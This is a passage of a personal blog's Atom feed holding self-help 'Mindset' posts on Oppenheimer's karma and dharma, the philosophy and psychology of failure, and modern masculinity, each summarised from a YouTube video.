+<p><a href="https://www.youtube.com/watch?v=3AlUoe0KXYc">The Philosophy of Karma, Dharma &amp; Oppenheimer</a></p>]]></content><author><name>Prakhar0x01</name></author><category term="Mindset" /><summary type="html"><![CDATA[Explore the philosophical insights of J. Robert Oppenheimer, focusing on his study of the Bhagavad Gita and the concept of consequences. Delve into the differences between external and internal consequences, and how they shaped Oppenheimer's views on his role in creating the atomic bomb. Understand the interplay of karma and dharma in both personal and global contexts.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Philosophy of Failure</title><link href="http://localhost:4000/mindset/2023/11/01/Failure/" rel="alternate" type="text/html" title="Philosophy of Failure" /><published>2023-11-01T00:00:00+05:30</published><updated>2023-11-01T00:00:00+05:30</updated><id>http://localhost:4000/mindset/2023/11/01/Failure</id><content type="html" xml:base="http://localhost:4000/mindset/2023/11/01/Failure/"><![CDATA[<blockquote>
+  <p>Failure is something everyone experiences, but how we view and deal with it can make all the difference. Let’s break down failure into simple terms and explore how it impacts us both philosophically and psychologically.</p>
+</blockquote>
+
+<h2 id="what-is-failure-">What is Failure ?</h2>
+
+<ul>
+  <li><strong>Basic Definition:</strong>
+    <ul>
+      <li>Failure is the situation when methods and outcomes do not align.</li>
+    </ul>
+  </li>
+  <li><strong>Society Definition:</strong>
+    <ul>
+      <li><strong>Materialistic View:</strong> Eg. Ask career advice from elders, and they may recommend government jobs due to the additional facilities and respect in society beyond just the salary.</li>
+    </ul>
+  </li>
+  <li><strong>Modernity Definition:</strong>
+    <ul>
+      <li><strong>Consumption View:</strong> Eg. You should look rich even if you’re not!</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="psychology-of-failure">Psychology of Failure</h2>
+
+<ul>
+  <li><strong>Rejection Reflection:</strong>
+    <ul>
+      <li>Why does it hurt so much? –&gt; Comparison, validation, appreciation.</li>
+      <li>People don’t see you as they saw you before, so in your mind, your newer version feels lesser than your older version.</li>
+    </ul>
+  </li>
+  <li><strong>Failure Hangover:</strong>
+    <ul>
+      <li>Your mind wants to figure out the lesson from it (which causes long stress/depression); different questions keep coming up in your mind.</li>
+    </ul>
+  </li>
+  <li><strong>Instructive Nature of Failure:</strong>
+    <ul>
+      <li>Every time you’re in the pain of failure –&gt; “Keep your eyes open! There’s a lesson in there,” and you’re seeing the world in hyper-reality.</li>
+    </ul>
+  </li>
+  <li><strong>Unsolved Puzzle:</strong>
+    <ul>
+      <li>Ask yourself questions.</li>
+      <li>Lesson learned for upcoming encounters.</li>
+    </ul>
+  </li>
+  <li><strong>The Last Day Paradox:</strong>
+    <ul>
+      <li>You consider that you’re no longer successful because you think today is the last day.</li>
+    </ul>
+  </li>
+  <li><strong>Learned Helplessness:</strong>
+    <ul>
+      <li>Every time you fail, you think that this pain must be avoided, so the next time your subconscious mind keeps telling you that you’re going to fail again.</li>
+      <li>And you’re not convinced, and the voice becomes stronger than before.</li>
+      <li>When you win –&gt; Serotonin increases in the mind = increased chance of winning.</li>
+      <li>When you lose –&gt; Serotonin decreases in the mind = increased chance of failing.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="on-big-failure">On Big Failure</h2>
+
+<ul>
+  <li>
+    <p><strong>Loss of Instincts:</strong> You are no longer in a condition to handle yourself.</p>
+  </li>
+  <li>
+    <p><strong>Your Base Reality Collapses:</strong> You don’t know how to see yourself or the world.</p>
+  </li>
+  <li>
+    <p><strong>Self-Doubt:</strong> You let other people into your head; in short, you’re brainwashed.</p>
+  </li>
+  <li>
+    <p><strong>Socially Induced Self-Alienation:</strong> Everybody leaves you, even your family members, and you’re alone now.</p>
+  </li>
+</ul>
+
+<h2 id="mind-altering-perspective">Mind-Altering Perspective</h2>
+
+<ul>
+  <li><strong>You Choose What You Fail At:</strong>
+    <ul>
+      <li>Failing in the process is different from failing in outcomes.</li>
+      <li>Desired outcomes based on societal expectations are not necessarily failures.</li>
+    </ul>
+  </li>
+  <li><strong>Asymmetry of Success:</strong>
+    <ul>
+      <li>Focus on the basics.</li>
+      <li>Eg. You don’t know the way to your friend’s house, so:
+        <ul>
+          <li>Every time you ask people in the middle of the way about the landmark –&gt; failure.</li>
+          <li>Your vehicle condition, driving skills –&gt; basics.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><strong>Build a Comfortable Failure Zone:</strong>
+    <ul>
+      <li>Keep enough cash in your pocket.</li>
+      <li>Stay surrounded by people who love you –&gt; family, friends.</li>
+    </ul>
+  </li>
+  <li><strong>Antifragile:</strong>
+    <ul>
+      <li>Every time you fail, ask yourself: “How do I make this failure turn me antifragile?”</li>
+      <li>“How do I make the best out of what I’ve got?”</li>
+    </ul>
+  </li>
+  <li><strong>The Balanced Mindset:</strong>
+    <ul>
+      <li>Try as you mean to succeed.</li>
+      <li>Fail as you mean to fail.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+<blockquote>
+  <p>Failure isn’t just an end; it’s a chance to learn and grow. By understanding its various aspects and shifting your perspective, you can turn setbacks into stepping stones for success. Embrace failure as a valuable part of your journey and keep moving forward.</p>
+</blockquote>
+
+<h3 id="references">References</h3>
+
+<p><a href="https://www.youtube.com/watch?v=MzV-hqup0Ok">The Philosophy and Psychology of Failure: A Guide to Bouncing Back</a></p>]]></content><author><name>Prakhar0x01</name></author><category term="Mindset" /><summary type="html"><![CDATA[Failure is an inevitable part of life, yet it’s often perceived as a negative endpoint rather than a valuable learning experience. Understanding the nuances of failure, both philosophically and psychologically, can transform how we approach setbacks and help us emerge stronger. Let's delve into the layers of failure and explore how we can shift our perspective to harness its potential.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Masculinity : Beyond the Stereotypes</title><link href="http://localhost:4000/mindset/2023/11/01/Masculinity/" rel="alternate" type="text/html" title="Masculinity : Beyond the Stereotypes" /><published>2023-11-01T00:00:00+05:30</published><updated>2023-11-01T00:00:00+05:30</updated><id>http://localhost:4000/mindset/2023/11/01/Masculinity</id><content type="html" xml:base="http://localhost:4000/mindset/2023/11/01/Masculinity/"><![CDATA[<blockquote>
+  <p>Masculinity encompasses more than just traditional roles and traits. It’s about taking responsibility, leading, and evolving. This guide explores what masculinity means today, the traits associated with it, and how it contrasts with feminine roles and energy.</p>
+</blockquote>
+
+<h3 id="what-is-masculinity">What is Masculinity?</h3>
+
+<ul>
+  <li>Frame of taking on the traditional role of men on a social level.</li>
+  <li>Mindset to approach the world.</li>
+  <li>Useful for social networking/problem solving.</li>
+  <li>Taking responsibility.</li>
+  <li>Mission-oriented.</li>
+  <li>The protector.</li>
+  <li>The provider.</li>
+  <li>The leader.</li>
+</ul>
+
+<h3 id="traits-of-masculinity">Traits of Masculinity:</h3>
+
+<ul>
+  <li><strong>Strength:</strong> Take responsibility and do it for others.</li>
+  <li><strong>Sacrifice</strong></li>
+  <li><strong>Discipline</strong></li>
+  <li><strong>Endurance</strong></li>
+</ul>
+
+<ol>
+  <li>
+    <p><strong>What about bitches and cars?</strong></p>
+
+    <ul>
+      <li>Marketing tool/strategy.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Is the point to be the most masculine person ever?</strong></p>
+
+    <ul>
+      <li>No, grow from a boy into a man, i.e., evolve.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Can women take a masculine role?</strong></p>
+
+    <ul>
+      <li>Yes, they can and they must (at the workplace).</li>
+      <li>E.g., “Feminism.”</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Should men take a feminine role?</strong></p>
+
+    <ul>
+      <li>Yes, it feels alive.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Is there a biological component to masculinity?</strong></p>
+
+    <ul>
+      <li>Yes, men are more biologically masculine than women.</li>
+      <li>It also depends on environment and exposure.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Is there such a thing as masculine energy?</strong></p>
+
+    <ul>
+      <li>Yes, but it is more about the brain (because mindset influences energy).</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Why is there a problem with modern masculinity?</strong></p>
+
+    <ul>
+      <li>Your parents and school raised you to focus completely on yourself. Then Twitter/Instagram makes you focus on yourself, i.e., a narcissistically driven society, constantly comparing you and telling you to look at yourself, presenting yourself in stories and reels, and portraying yourself as the smartest person. It is some kind of scene from a movie; it’s not even self-reflection, it is self-objectification.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Difference between masculinity and femininity:</strong></p>
+
+    <ul>
+      <li><strong>Masculinity :</strong> What needs/supposed to be done?</li>
+      <li><strong>Femininity :</strong> What needs to be lived in it (what is happening to me, how much I experience)?</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="conclusion">Conclusion</h3>
+<blockquote>
+  <p>Masculinity is more than just traditional roles; it’s about evolving, taking responsibility, and embracing various aspects of both masculine and feminine energies. Understanding these dynamics can help you navigate your personal growth and societal expectations more effectively.</p>
+</blockquote>
+
+<h3 id="references">References</h3>
+
+<p><a href="https://www.youtube.com/watch?v=GgS9Q8zVL2k">WHAT makes YOU embrace MASCULINITY?</a></p>]]></content><author><name>Prakhar0x01</name></author><category term="Mindset" /><summary type="html"><![CDATA[Masculinity encompasses more than just traditional roles and traits. It's about taking responsibility, leading, and evolving. This guide explores what masculinity means today, the traits associated with it, and how it contrasts with feminine roles and energy.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
